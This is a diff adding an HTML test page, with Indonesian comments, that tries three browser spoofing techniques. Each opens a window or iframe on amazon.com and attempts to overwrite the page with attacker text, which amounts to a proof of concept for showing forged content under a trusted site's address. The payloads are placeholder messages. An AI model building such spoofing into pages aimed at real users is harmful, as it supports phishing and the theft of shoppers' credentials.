@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body style="padding: 20px; font-family: Arial;">
+    <h2>🔥 Simple Spoof Test</h2>
+    
+    <button onclick="testSpoof()" style="padding: 15px 30px; font-size: 18px; background: #ff9900; color: white; border: none; border-radius: 5px; cursor: pointer;">
+        TEST SPOOF NOW
+    </button>
+    
+    <div id="result" style="margin-top: 20px; padding: 15px; background: #f0f0f0; border-radius: 5px; display: none;"></div>
+    
+    <script>
+        function testSpoof() {
+            const result = document.getElementById('result');
+            
+            // Coba beberapa teknik berbeda
+            const techniques = [
+                () => technique1(),
+                () => technique2(),
+                () => technique3()
+            ];
+            
+            // Jalankan semua teknik
+            for(let i = 0; i < techniques.length; i++) {
+                setTimeout(() => {
+                    try {
+                        techniques[i]();
+                        result.innerHTML += `<div style="color: green; margin: 5px 0;">✓ Teknik ${i+1} dijalankan</div>`;
+                        result.style.display = 'block';
+                    } catch(e) {
+                        result.innerHTML += `<div style="color: red; margin: 5px 0;">✗ Teknik ${i+1} gagal: ${e.message}</div>`;
+                        result.style.display = 'block';
+                    }
+                }, i * 1000);
+            }
+        }
+        
+        function technique1() {
+            // Teknik dasar
+            const w = window.open('about:blank', 'test1');
+            w.location.href = 'https://www.amazon.com';
+            setTimeout(() => {
+                if(w && !w.closed) {
+                    w.document.write('<h1>SPOOF TECHNIQUE 1 WORKS!</h1>');
+                }
+            }, 500);
+        }
+        
+        function technique2() {
+            // Teknik dengan iframe
+            const w = window.open('', 'test2');
+            w.document.write(`
+                <iframe src="https://www.amazon.com" style="width:100%;height:100%;border:none;" id="amazonFrame"></iframe>
+                <script>
+                    setTimeout(() => {
+                        document.body.innerHTML = '<h2>SPOOF TECHNIQUE 2 WORKS!</h2>';
+                    }, 1000);
+                <\/script>
+            `);
+        }
+        
+        function technique3() {
+            // Teknik langsung
+            const w = window.open('https://www.amazon.com', 'test3');
+            // Coba timpa secepat mungkin
+            let attempts = 0;
+            const tryWrite = setInterval(() => {
+                attempts++;
+                if(attempts > 10) {
+                    clearInterval(tryWrite);
+                    return;
+                }
+                try {
+                    w.document.write('<h1>SPOOF TECHNIQUE 3 WORKS!</h1>');
+                    clearInterval(tryWrite);
+                } catch(e) {
+                    // Continue trying
+                }
+            }, 100);
+        }
+    </script>
+</body>
+</html>
